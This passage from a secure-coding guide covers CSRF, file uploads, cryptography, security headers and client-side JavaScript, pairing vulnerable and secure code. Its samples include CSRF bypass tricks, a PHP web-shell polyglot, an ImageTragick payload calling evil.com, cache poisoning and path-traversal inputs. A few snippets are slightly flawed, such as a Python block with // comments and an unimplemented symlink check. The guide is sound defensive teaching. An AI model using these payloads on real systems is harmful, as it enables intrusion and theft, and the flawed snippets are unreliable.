**Defense:** Always resolve hostnames to normalized IP addresses before validation. Use the standard library's IP parsing, which handles all these encodings.

## Verification

- Submit `http://169.254.169.254/` as a URL parameter — should be blocked
- Submit `http://127.0.0.1:8080/` — should be blocked
- Submit `http://2130706433/` (decimal IP for 127.0.0.1) — should be blocked
- Submit a domain that redirects to an internal IP — should be blocked
- Check that only HTTPS URLs are accepted

---

── Page 10 ──

# Chapter 9: Cross-Site Request Forgery (CSRF)

**Threat Summary:** CSRF tricks an authenticated user's browser into making state-changing requests to a target application. The browser automatically attaches cookies, so the forged request appears legitimate.

**Severity:** HIGH

## Quick Reference: CSRF Decision Table

| Condition | CSRF Possible? |
|-----------|---------------|
| State-changing action (POST/PUT/DELETE) | Yes — needs protection |
| Read-only action (GET) | No — GET should not change state |
| Authentication via cookies only | Yes — cookies are attached automatically |
| Authentication via Authorization header | No — custom headers are not attached cross-origin |
| SameSite=Strict cookies | Protected — cookies not sent cross-site |
| SameSite=Lax cookies | Partially protected — cookies sent on top-level navigation (GET) only |
| CORS preflight required | Protected — browser sends OPTIONS first; server must explicitly allow |

## Core Rules

**Rule 1: Use SameSite=Strict (or Lax) cookies as the primary CSRF defense.**

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- `Strict`: cookie never sent on cross-site requests (best protection, but breaks legitimate cross-site navigation)
- `Lax`: cookie sent on top-level GET navigation only (good balance for most apps)

**Rule 2: For forms, add a CSRF token as a hidden field.**

```javascript
// Server: generate and store CSRF token in session
const csrfToken = crypto.randomBytes(32).toString("hex");
req.session.csrfToken = csrfToken;

// HTML: include in form
<form method="POST" action="/api/transfer">
  <input type="hidden" name="_csrf" value="${csrfToken}" />
  <!-- ... other fields ... -->
</form>

// Server: validate on submission
if (req.body._csrf !== req.session.csrfToken) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

**Rule 3: For AJAX APIs, use custom headers.**
The `Origin` header and custom request headers (e.g., `X-Requested-With`) cannot be set cross-origin without CORS preflight approval.

```javascript
// Client
fetch("/api/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": csrfToken,
  },
  body: JSON.stringify(data),
});

// Server middleware
if (req.method !== "GET" && req.headers["x-csrf-token"] !== req.session.csrfToken) {
  return res.status(403).json({ error: "CSRF validation failed" });
}
```

**Rule 4: Never perform state-changing operations on GET requests.**
GET requests should be safe and idempotent. Links, image tags, and iframes can all trigger GET requests cross-origin without any protection.

## Real-World CSRF Bypass Techniques

These bypass techniques exploit common implementation flaws in CSRF protections. Test for all of them during security reviews.

**1. Conditional token validation flaw:**
Many applications only validate the CSRF token IF it is present in the request. If the attacker removes the token parameter entirely, the server skips validation.

```
// The vulnerable server-side check:
if (req.body._csrf && req.body._csrf !== req.session.csrfToken) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
// If _csrf is missing entirely, the check is skipped!

// SECURE — always require the token
if (req.body._csrf !== req.session.csrfToken) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

**Testing:** Submit the state-changing request without the CSRF token parameter at all (remove it from the form or request body). If the request succeeds, the protection is bypassable.

**2. Token pool attack (non-session-bound tokens):**
Some applications validate that the submitted token is "a valid token" but don't verify it belongs to the current user's session. The attacker uses their own valid CSRF token in the forged request.

```
// VULNERABLE — checks if token exists in the global token table
const isValid = await db.csrfTokens.findOne({ token: req.body._csrf });
// Attacker's own valid token passes this check!

// SECURE — bind token to the specific session
if (req.body._csrf !== req.session.csrfToken) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

**Testing:** Log in as Attacker, get a valid CSRF token, then use it in a forged request targeting Victim's session.

**3. Double-submit cookie weakness:**
The double-submit cookie pattern checks that a cookie value matches a request parameter. If the server only checks equality (cookie == parameter) without validating the token itself, an attacker who can set cookies (via subdomain XSS, CRLF injection, or a related-domain vulnerability) can set both values to any matching string.

```
// VULNERABLE double-submit — no server-side token validation
if (req.cookies.csrfToken !== req.body._csrf) {
  return res.status(403);
}
// Attacker sets cookie "csrfToken=anything" and sends _csrf=anything — match!

// SECURE double-submit — use signed/HMAC'd tokens
const expectedToken = crypto.createHmac("sha256", secret)
  .update(req.session.id)
  .digest("hex");
if (req.body._csrf !== expectedToken) {
  return res.status(403);
}
```

**4. Referer header bypass:**
Applications that rely on Referer header validation for CSRF protection can be bypassed:

- **Omit the Referer entirely:** Add `<meta name="referrer" content="no-referrer">` to the attacker's page. Many applications skip validation when the Referer header is absent.
- **Domain parsing bypass:** If the application checks whether the Referer contains the victim domain:
  - Subdomain trick: `https://victim.com.attacker.com/csrf-page` — contains "victim.com"
  - Path trick: `https://attacker.com/victim.com/csrf-page` — contains "victim.com"
  - Query trick: `https://attacker.com/page?ref=victim.com` — contains "victim.com"

```
// VULNERABLE — substring match on Referer
const referer = req.headers.referer || "";
if (!referer.includes("example.com")) {
  return res.status(403);
}
// "example.com.evil.com" passes! "evil.com/example.com" passes!

// SECURE — parse and validate the origin strictly
const referer = req.headers.referer;
if (!referer) {
  return res.status(403); // Reject missing Referer
}
const refererOrigin = new URL(referer).origin;
if (refererOrigin !== "https://example.com") {
  return res.status(403);
}
```

**CSRF bypass testing checklist:**
- [ ] Remove the CSRF token parameter entirely — does the request still succeed?
- [ ] Use another user's valid CSRF token — does it work across sessions?
- [ ] If double-submit cookies are used, can you set cookies via a related vulnerability?
- [ ] Submit the request with `Referer: https://example.com.attacker.com` — does it pass?
- [ ] Submit the request with no Referer header — does it pass?
- [ ] Change Content-Type to `text/plain` to avoid CORS preflight — does validation still apply?

## Verification

- Create an HTML page with a form that auto-submits to the target app — the request should be blocked
- Verify SameSite attribute is set on session cookies
- Verify CSRF tokens are present in all state-changing forms
- Test that the CSRF token is validated server-side (submit without it)
- Test all bypass techniques listed above

---

── Page 11 ──

# Chapter 10: File Upload Security

**Threat Summary:** File upload is one of the most dangerous features to implement. Attackers upload web shells, malware, XSS payloads (SVG), and oversized files to achieve code execution, XSS, or denial of service.

**Severity:** CRITICAL (web shell upload), HIGH (XSS via SVG), MEDIUM (DoS via large files)

## Core Rules

**Rule 1: Validate file type by extension AND content (magic bytes), never by MIME type alone.**
The Content-Type header is user-controlled and meaningless for security.

```javascript
import fileType from "file-type";

async function validateUpload(file: Buffer, originalName: string) {
  // 1. Check extension
  const ext = path.extname(originalName).toLowerCase();
  const allowedExtensions = new Set([".pdf", ".png", ".jpg", ".jpeg", ".gif"]);
  if (!allowedExtensions.has(ext)) {
    throw new Error("File type not allowed");
  }

  // 2. Check magic bytes (actual file content)
  const type = await fileType.fromBuffer(file);
  const allowedMimeTypes = new Set(["application/pdf", "image/png", "image/jpeg", "image/gif"]);
  if (!type || !allowedMimeTypes.has(type.mime)) {
    throw new Error("File content does not match expected type");
  }

  // 3. Check file size
  const maxSize = 10 * 1024 * 1024; // 10 MB
  if (file.length > maxSize) {
    throw new Error("File too large");
  }
}
```

**Rule 2: Never serve uploaded files from the same domain as your application.**
Use a separate domain (e.g., `uploads.example-cdn.com`) or a cloud storage service with proper content-type headers. This prevents uploaded XSS payloads from accessing the application's cookies.

**Rule 3: Store uploaded files with generated names, never the original filename.**

```javascript
const storedName = `${crypto.randomUUID()}.${allowedExt}`;
// Never use: path.join(uploadDir, originalFilename) — path traversal risk
```

**Rule 4: Set Content-Disposition: attachment for all user-uploaded files.**
This forces download instead of rendering in the browser, preventing XSS execution.

**Rule 5: Never allow SVG uploads without sanitization.**
SVGs are XML documents that can contain `<script>` tags, event handlers, and external resource references.

**Rule 6: Scan for ZIP-specific attacks.**
- **Zip Slip**: archive entries with paths like `../../../etc/cron.d/malicious` escape the extraction directory
- **ZIP bombs**: small file that decompresses to enormous size (DoS)
- **Symlink attacks**: archive contains symlinks pointing to sensitive files

**Rule 7: Never serve uploaded files from the application directory.**
Uploaded files stored within the web root can be executed directly by the server (e.g., a PHP file served by Apache). Always store uploads outside the web root or on a separate storage service (S3, GCS, Azure Blob).

**Rule 8: Implement antivirus scanning for uploaded files.**
Scan files asynchronously after upload but before making them available. Use ClamAV or a cloud-based scanning API. Do not rely solely on AV — attackers can evade detection with custom payloads.

## Magic Byte Validation Bypass and Polyglot Files

Attackers bypass magic byte validation by creating **polyglot files** — files that are simultaneously valid in two formats.

**GIFAR (GIF + JAR/PHP polyglot):**

```
GIF89a           <- Valid GIF header (magic bytes)
<?php system($_GET['cmd']); ?>  <- PHP code appended after GIF header
```

This file passes both extension validation (.gif) and magic byte validation (starts with `GIF89a`), but if served by a PHP-enabled server, it executes as PHP.

**PNG + PHP polyglot:**

```python
// Attacker creates a valid PNG that embeds PHP in metadata
// The file has valid PNG magic bytes (89 50 4E 47) and valid PNG structure
// but PHP code is embedded in an ancillary chunk (tEXt or iTXt)
```

**Defense against polyglot files:**

```javascript
import fileType from "file-type";
import sharp from "sharp";

async function validateImage(buffer, originalName) {
  // 1. Check extension
  const ext = path.extname(originalName).toLowerCase();
  if (![".png", ".jpg", ".jpeg", ".gif", ".webp"].includes(ext)) {
    throw new Error("File type not allowed");
  }

  // 2. Check magic bytes
  const type = await fileType.fromBuffer(buffer);
  if (!type || !["image/png", "image/jpeg", "image/gif", "image/webp"].includes(type.mime)) {
    throw new Error("Invalid image content");
  }

  // 3. RE-ENCODE the image — this strips any embedded code
  // This is the strongest defense against polyglot files
  const sanitized = await sharp(buffer)
    .resize({ width: 4096, height: 4096, fit: "inside", withoutEnlargement: true })
    .toFormat(type.ext === "gif" ? "gif" : "png")
    .toBuffer();

  // 4. Check file size after re-encoding
  if (sanitized.length > 10 * 1024 * 1024) {
    throw new Error("File too large after processing");
  }

  return sanitized;
}
```

**Rule:** For image uploads, always re-encode the image using a library like `sharp`, `Pillow`, or `ImageMagick` (with safe configuration). Re-encoding destroys any embedded code while preserving the visual content.

## Zip Slip Attack Prevention

Zip Slip occurs when archive extraction fails to validate entry paths, allowing files to be written outside the intended directory.

```javascript
// VULNERABLE — no path validation during extraction
const AdmZip = require("adm-zip");
const zip = new AdmZip(uploadedFile);
zip.extractAllTo("/uploads/extracted/", true); // May write to ../../../etc/cron.d/

// SECURE — validate each entry path before extraction
const AdmZip = require("adm-zip");
const zip = new AdmZip(uploadedFile);
const targetDir = path.resolve("/uploads/extracted/");

for (const entry of zip.getEntries()) {
  const entryPath = path.resolve(targetDir, entry.entryName);

  // Block path traversal
  if (!entryPath.startsWith(targetDir + path.sep)) {
    throw new Error(`Zip Slip detected: ${entry.entryName}`);
  }

  // Block symlinks
  if (entry.isDirectory) {
    fs.mkdirSync(entryPath, { recursive: true });
  } else {
    // Check cumulative extracted size (zip bomb defense)
    totalSize += entry.header.size;
    if (totalSize > MAX_EXTRACTED_SIZE) {
      throw new Error("Archive exceeds maximum extracted size");
    }
    fs.writeFileSync(entryPath, entry.getData());
  }
}
```

## ImageTragick and Image Processing Exploits

ImageMagick has a history of critical vulnerabilities (CVE-2016-3714 "ImageTragick"). If your application processes images with ImageMagick:

```
// VULNERABLE ImageMagick processing — attacker uploads this as "image.mvg"
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/image.jpg"|ls "-la)'
pop graphic-context
```

**Prevention:**

```xml
<!-- /etc/ImageMagick-6/policy.xml — restrict dangerous coders -->
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="resource" name="memory" value="256MiB" />
  <policy domain="resource" name="map" value="512MiB" />
  <policy domain="resource" name="width" value="8KP" />
  <policy domain="resource" name="height" value="8KP" />
  <policy domain="resource" name="area" value="64MP" />
  <policy domain="resource" name="disk" value="1GiB" />
</policymap>
```

**Better alternative:** Use `sharp` (Node.js) or `Pillow` (Python) instead of ImageMagick. They have a much smaller attack surface.

## Verification

- Upload a `.php` file renamed to `.jpg` — should be rejected by magic byte validation
- Upload an SVG with `<script>alert(1)</script>` — should be sanitized or rejected
- Upload a file with `../../etc/passwd` as the filename — should be rejected
- Upload a polyglot file (valid image header + embedded code) — should be stripped by re-encoding
- Upload a ZIP with `../` in entry paths — extraction should be blocked
- Upload a ZIP bomb (small file, huge decompressed size) — should be caught by size limits
- Verify uploaded files are served from a separate domain
- Verify Content-Disposition header on file downloads
- Verify uploaded files are NOT in the web root or application directory

---

── Page 12 ──

# Chapter 11: Cryptography and Transport Security

**Threat Summary:** Weak cryptography and insecure transport expose sensitive data to interception and tampering. This includes passwords, session tokens, personal data, and API keys.

**Severity:** CRITICAL (password storage, transport), HIGH (weak algorithms)

## Quick Reference: Algorithm Selection

| Purpose | Use | Never Use |
|---------|-----|-----------|
| Password hashing | Argon2id, bcrypt (cost 12+), scrypt | MD5, SHA-1, SHA-256 (for passwords) |
| General hashing | SHA-256, SHA-3 | MD5, SHA-1 |
| Symmetric encryption | AES-256-GCM | DES, 3DES, RC4, ECB mode |
| Asymmetric encryption | RSA-2048+, Ed25519 | RSA-1024, DSA |
| TLS version | TLS 1.2+, prefer TLS 1.3 | SSL v3, TLS 1.0, TLS 1.1 |
| Key derivation | HKDF, PBKDF2 (100k+ iterations) | Direct key use |

## Core Rules

**Rule 1: Enforce TLS 1.2+ on all connections. No plaintext HTTP for any sensitive operation.**
All authentication, session management, and sensitive data transfer must occur over HTTPS. Redirect HTTP to HTTPS and set HSTS headers.

**Rule 2: Never implement custom cryptography.**
Use well-established libraries (libsodium, OpenSSL, Web Crypto API). Custom cryptographic implementations will contain vulnerabilities.

**Rule 3: Never store encryption keys in source code, environment variables visible to logs, or version control.**
Use a secrets manager (Vault, AWS Secrets Manager, etc.) and rotate keys regularly.

**Rule 4: Use authenticated encryption (AES-GCM or ChaCha20-Poly1305).**
Encryption without authentication (AES-CBC without HMAC) is vulnerable to padding oracle attacks and ciphertext manipulation.

**Rule 5: Generate IVs/nonces correctly.**
- AES-GCM: 96-bit random nonce, never reuse with the same key
- AES-CBC: 128-bit random IV

**Rule 6: Use timing-safe comparison for secrets.**
Standard string comparison (`===`) leaks information through timing differences. An attacker can deduce the correct value one character at a time by measuring response times.

## TLS 1.3 Configuration

```nginx
// SECURE — nginx TLS 1.3 configuration
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;

    # TLS versions — only 1.2 and 1.3
    ssl_protocols TLSv1.2 TLSv1.3;

    # TLS 1.3 cipher suites (configured separately)
    # TLS 1.3 only allows secure ciphers, no configuration needed

    # TLS 1.2 cipher suites — strong only
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers on;

    # OCSP stapling
    ssl_stapling on;
    ssl_stapling_verify on;

    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # Session resumption (improves performance)
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    ssl_session_tickets off;  # Disable for forward secrecy
}
```

## Timing-Safe Comparison

```javascript
import crypto from "crypto";

// VULNERABLE — standard comparison leaks timing info
function verifyToken(provided, expected) {
  return provided === expected; // Returns faster for mismatches at earlier positions
}

// SECURE — constant-time comparison
function verifyTokenSafe(provided, expected) {
  if (typeof provided !== "string" || typeof expected !== "string") {
    return false;
  }
  // timingSafeEqual requires same-length buffers
  const a = Buffer.from(provided);
  const b = Buffer.from(expected);
  if (a.length !== b.length) {
    // Compare against expected anyway to avoid length-based timing leak
    return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(expected)) && false;
  }
  return crypto.timingSafeEqual(a, b);
}
```

```python
// VULNERABLE
def verify_token(provided, expected):
    return provided == expected  # Timing leak

// SECURE
import hmac
def verify_token(provided, expected):
    return hmac.compare_digest(provided.encode(), expected.encode())
```

## Why ECB Mode Is Dangerous

ECB (Electronic Codebook) encrypts each block independently with the same key. Identical plaintext blocks produce identical ciphertext blocks, revealing patterns in the data.

```
Plaintext blocks:   [AAAA] [BBBB] [AAAA] [CCCC]
ECB ciphertext:     [xxxx] [yyyy] [xxxx] [zzzz]  <- Pattern visible! Blocks 1 and 3 match
CBC ciphertext:     [xxxx] [yyyy] [zzzz] [wwww]  <- No pattern visible
```

**Real-world impact:** The "ECB penguin" — encrypting an image in ECB mode preserves the visual pattern of the original image. Any structured data (database records, protocol messages) encrypted with ECB leaks structure.

**Rule:** Never use ECB mode. Use AES-GCM (authenticated), AES-CBC with HMAC, or ChaCha20-Poly1305.

## Key Derivation

Never use raw passwords or short strings as encryption keys. Use a key derivation function (KDF) to convert passwords into strong keys.

```javascript
import crypto from "crypto";

// VULNERABLE — using password directly as key
const key = Buffer.from(password.padEnd(32, "\0")); // Weak!
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);

// SECURE — derive key with PBKDF2
const salt = crypto.randomBytes(16);
const key = crypto.pbkdf2Sync(password, salt, 310000, 32, "sha256"); // 310k iterations
const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);

// BETTER — use Argon2id for key derivation from passwords
import argon2 from "argon2";
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536, // 64 MB
  timeCost: 3,       // 3 iterations
  parallelism: 4,
});
```

## Certificate Pinning

Certificate pinning binds your application to specific certificates or public keys, preventing MITM attacks even if a CA is compromised.

```javascript
// Node.js HTTPS request with certificate pinning
import https from "https";

const options = {
  hostname: "api.example.com",
  port: 443,
  path: "/data",
  method: "GET",
  // Pin the SHA-256 hash of the server's public key
  checkServerIdentity: (host, cert) => {
    const pubKeyHash = crypto
      .createHash("sha256")
      .update(cert.pubkey)
      .digest("base64");

    const pinnedKeys = [
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", // Primary
      "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=", // Backup
    ];

    if (!pinnedKeys.includes(pubKeyHash)) {
      throw new Error(`Certificate pin mismatch for ${host}`);
    }
  },
};
```

**Warning:** Certificate pinning can cause outages if certificates are rotated without updating pins. Always pin at least two keys (primary + backup) and have a rotation plan.

## Verification

- Test TLS configuration with `ssllabs.com/ssltest` — aim for A+ rating
- Verify HSTS header is present with adequate `max-age` (at least 1 year)
- Check that no sensitive data is transmitted over HTTP (including mixed content)
- Verify password hashing algorithm in the codebase (must be bcrypt/scrypt/Argon2id)
- Check for hard-coded keys or secrets in source code
- Verify AES-GCM or ChaCha20-Poly1305 is used (not ECB or raw CBC)
- Confirm timing-safe comparison is used for token/secret verification
- Test that TLS 1.0 and 1.1 are rejected

---

── Page 13 ──

# Chapter 12: Security Headers and Browser Defenses

**Threat Summary:** Security headers instruct browsers to enable built-in security features. Missing headers leave the application vulnerable to XSS, clickjacking, MIME sniffing, and other browser-side attacks.

**Severity:** HIGH

## Quick Reference: Complete Header Checklist

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=(), usb=(), payment=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
X-XSS-Protection: 0
Cache-Control: no-store
```

## Core Rules

**Rule 1: Deploy CSP with nonces and strict-dynamic.**

```javascript
// Next.js middleware example
import { NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString("base64");
  const csp = [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `font-src 'self'`,
    `connect-src 'self'`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `object-src 'none'`,
  ].join("; ");

  const response = NextResponse.next();
  response.headers.set("Content-Security-Policy", csp);
  return response;
}
```

**Never use these CSP directives in production:**
- `unsafe-inline` — defeats XSS protection entirely
- `unsafe-eval` — allows eval(), negating CSP benefits
- `*` as a source — allows any origin
- `data:` for `script-src` — allows data: URI script execution

**Rule 2: Set X-XSS-Protection to 0 (disable the legacy XSS auditor).**
The legacy browser XSS auditor is deprecated and can actually introduce vulnerabilities. CSP is the proper XSS mitigation.

**Rule 3: Deploy CSP in Report-Only mode first.**
Use `Content-Security-Policy-Report-Only` to identify violations before enforcement. Configure a reporting endpoint to collect violations.

**Rule 4: Set frame-ancestors 'none' to prevent clickjacking.**
This is the modern replacement for `X-Frame-Options: DENY`.

## Complete CSP with Nonce Example

A nonce-based CSP requires generating a unique random value per request and adding it to both the CSP header and every inline script tag.

```javascript
// Express middleware — complete CSP with nonces
import crypto from "crypto";

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.cspNonce = nonce;

  const csp = [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,    // Nonce + strict-dynamic
    `style-src 'self' 'nonce-${nonce}'`,                // Styles also need nonces
    `img-src 'self' data: https:`,
    `font-src 'self'`,
    `connect-src 'self' https://api.example.com`,       // API endpoints
    `media-src 'self'`,
    `object-src 'none'`,                                // Block Flash/Java
    `frame-ancestors 'none'`,                           // Prevent clickjacking
    `base-uri 'self'`,                                  // Prevent base tag hijacking
    `form-action 'self'`,                               // Restrict form submissions
    `upgrade-insecure-requests`,                        // Auto-upgrade HTTP to HTTPS
    `report-uri /api/csp-report`,                       // Violation reporting
  ].join("; ");

  res.setHeader("Content-Security-Policy", csp);
  next();
});

// In HTML templates, every inline script needs the nonce:
// <script nonce="<%= cspNonce %>">console.log("allowed")</script>
```

## Permissions-Policy Configuration

Permissions-Policy (formerly Feature-Policy) controls which browser features your site can use. Disable everything you do not need.

```http
Permissions-Policy: accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), cross-origin-isolated=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=(self), geolocation=(), gyroscope=(), keyboard-map=(), magnetometer=(), microphone=(), midi=(), navigation-override=(), payment=(), picture-in-picture=(self), publickey-credentials-get=(), screen-wake-lock=(), sync-xhr=(), usb=(), web-share=(self), xr-spatial-tracking=()
```

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader("Permissions-Policy",
    "camera=(), microphone=(), geolocation=(), payment=(), usb=(), " +
    "display-capture=(), fullscreen=(self), picture-in-picture=(self)"
  );
  next();
});
```

## COOP and COEP Headers

Cross-Origin-Opener-Policy (COOP) and Cross-Origin-Embedder-Policy (COEP) enable site isolation, which is required for features like `SharedArrayBuffer` and high-resolution timers.

```http
// Full isolation — required for SharedArrayBuffer
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin

// Less strict — allows cross-origin popups
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

**Warning:** COEP `require-corp` blocks loading cross-origin resources (images, scripts, fonts from CDNs) unless they include `Cross-Origin-Resource-Policy: cross-origin` or are served via CORS. Test thoroughly before deploying.

## Subresource Integrity (SRI)

SRI ensures that scripts and stylesheets loaded from CDNs have not been tampered with. The browser checks a cryptographic hash before executing the resource.

```html
<!-- WITHOUT SRI — if the CDN is compromised, malicious code executes -->
<script src="https://cdn.example.com/library.js"></script>

<!-- WITH SRI — browser blocks execution if hash doesn't match -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>

<!-- Generate SRI hash: -->
<!-- openssl dgst -sha384 -binary library.js | openssl base64 -A -->
<!-- Or use: https://www.srihash.org/ -->
```

```javascript
// Generating SRI hashes in Node.js
import crypto from "crypto";
import fs from "fs";

const content = fs.readFileSync("library.js");
const hash = crypto.createHash("sha384").update(content).digest("base64");
console.log(`sha384-${hash}`);
```

**Core Rules for SRI:**
1. Add `integrity` attributes to all `<script>` and `<link>` tags loading from CDNs
2. Always include `crossorigin="anonymous"` alongside `integrity`
3. Update SRI hashes when updating CDN library versions
4. Use SHA-384 or SHA-512 for the hash algorithm

## CSP Reporting Configuration

```javascript
// CSP report-uri endpoint
app.post("/api/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  const report = req.body["csp-report"];
  logger.warn("CSP violation", {
    blockedUri: report["blocked-uri"],
    violatedDirective: report["violated-directive"],
    documentUri: report["document-uri"],
    sourceFile: report["source-file"],
    lineNumber: report["line-number"],
  });
  res.status(204).end();
});

// Modern Reporting API (Reporting-Endpoints header)
// Replaces the deprecated report-uri directive
app.use((req, res, next) => {
  res.setHeader("Reporting-Endpoints", 'csp-endpoint="/api/csp-report"');
  // Then use report-to in CSP:
  // Content-Security-Policy: ...; report-to csp-endpoint
  next();
});
```

## Cache Poisoning and Web Cache Deception

**Cache Poisoning** — attacker manipulates unkeyed headers to store malicious content in the cache for other users.

```
// Attack: Inject XSS via unkeyed X-Forwarded-Host header
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com

// If the application uses X-Forwarded-Host to generate links/script sources:
// Response includes: <script src="https://evil.com/malicious.js">
// This response gets cached and served to all visitors
```

**Web Cache Deception** — attacker tricks the cache into storing a page with sensitive user data.

```
// Attack: Victim visits a URL that looks like a static resource
https://victim.com/account/settings/nonexistent.css

// If the application serves the account/settings page (ignoring the .css path)
// AND the cache stores it because of the .css extension:
// The attacker can then fetch the cached page and read the victim's data
```

**Prevention:**

```javascript
// SECURE — set Cache-Control headers explicitly on dynamic pages
app.use("/account/*", (req, res, next) => {
  res.setHeader("Cache-Control", "no-store, private");
  res.setHeader("Vary", "Cookie, Authorization");
  next();
});

// SECURE — validate that the URL path matches the content type served
app.use((req, res, next) => {
  // If the path ends with a static extension but the route serves dynamic content, block it
  const staticExtensions = [".css", ".js", ".png", ".jpg", ".gif", ".svg", ".ico"];
  if (staticExtensions.some(ext => req.path.endsWith(ext)) && !req.route?.isStatic) {
    return res.status(404).end();
  }
  next();
});
```

**Core Rules for cache security:**
1. Set `Cache-Control: no-store, private` on all pages containing user-specific data
2. Use `Vary: Cookie` to prevent cross-user cache sharing
3. Configure CDN/cache to only cache responses with explicit cache headers
4. Do not trust `X-Forwarded-Host` or similar headers for generating URLs without validation
5. Return 404 for paths with mismatched extensions (e.g., `/account.css`)

## Implementation Order

1. `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy` — low risk of breakage
2. `Content-Security-Policy` in Report-Only mode — iterate until violations resolved
3. `Permissions-Policy` — disable unused browser APIs
4. Cross-Origin headers (COOP, COEP, CORP) — for site isolation
5. SRI on all CDN-loaded scripts and stylesheets
6. `Cache-Control` on all dynamic/authenticated pages

## Verification

- Check headers at securityheaders.com
- Verify CSP with Google's CSP Evaluator
- Test that the page loads correctly with all headers enabled
- Verify no inline scripts without nonces
- Test clickjacking by embedding the page in an iframe from another domain
- Verify SRI attributes on all CDN-loaded `<script>` and `<link>` tags
- Check that dynamic pages have `Cache-Control: no-store` or `private`
- Test CSP reporting endpoint receives violation reports
- Verify Permissions-Policy disables all unused browser features

---

── Page 14 ──

# Chapter 13: Client-Side Security

**Threat Summary:** Modern client-side JavaScript introduces vulnerability classes beyond traditional XSS, including prototype pollution, DOM clobbering, and postMessage exploitation.

**Severity:** HIGH (prototype pollution), MEDIUM (DOM clobbering, postMessage)

## Prototype Pollution

Attackers modify `Object.prototype` by injecting `__proto__`, `constructor`, or `prototype` keys into objects that are recursively merged or deep-copied.

**Impact:** Authentication bypass, XSS via gadget chains, RCE in Node.js

```javascript
// VULNERABLE — deep merge without key filtering
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === "object") {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends: { "__proto__": { "isAdmin": true } }
merge({}, userInput);
// Now every object in the app has .isAdmin === true

// SECURE — reject dangerous keys
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      continue; // Skip dangerous keys
    }
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

**Defense:** Use `Map` instead of plain objects for user-controlled data. Use `Object.create(null)` for lookup tables. Reject `__proto__`, `constructor`, and `prototype` keys in all input processing.

## PostMessage Security

```javascript
// VULNERABLE — no origin check
window.addEventListener("message", (event) => {
  document.getElementById("output").innerHTML = event.data; // XSS + no origin check
});

// SECURE — validate origin and use safe DOM API
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example.com") return;
  document.getElementById("output").textContent = event.data;
});
```

## Reverse Tabnabbing

```html
<!-- VULNERABLE — opened page can redirect the opener -->
<a href="https://external.com" target="_blank">Link</a>

<!-- SECURE -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>
```

## CORS Misconfiguration

```javascript
// VULNERABLE — reflects any origin with credentials
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});

